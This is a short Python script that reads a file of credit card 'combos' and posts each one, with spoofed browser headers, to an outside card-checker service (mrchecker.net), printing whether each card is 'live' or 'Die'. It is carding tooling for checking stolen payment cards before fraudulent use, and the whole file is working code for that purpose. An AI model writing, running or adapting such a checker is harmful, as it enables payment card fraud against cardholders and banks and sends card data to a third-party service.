import argparse
import requests
from time import sleep
combos=[]
args=argparse.ArgumentParser()
args.add_argument("combos",help="Locate the cc combos")
var=args.parse_args()
path=var.combos
def req(num):
    global table
    num=num-1
    cc=temp[num]
    staticData={'data':cc,'accept-encoding' : "gzip, deflate, br","accept-language" : "en-US,en;q=0.9","origin" : "https://www.mrchecker.net","referer" : "https://www.mrchecker.net/card-checker//ccn2/","user-agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" }
    post=requests.post(url='https://www.mrchecker.net/card-checker//ccn2/api.php',data=staticData)
    if 'Live' in post.text :
        print(' live   - ',cc)
    elif 'Die' in post.text :
        print(' Die    - ',cc)
    else:
        print('Unknown - ',cc)



try:
    global temp
    file=open(path,'r')
    temp=file.readlines()
    i=len(temp)
    while i>=0:
        req(i)
        sleep(1)
        i=i-1



except Exception as e:
    print("error is ", e)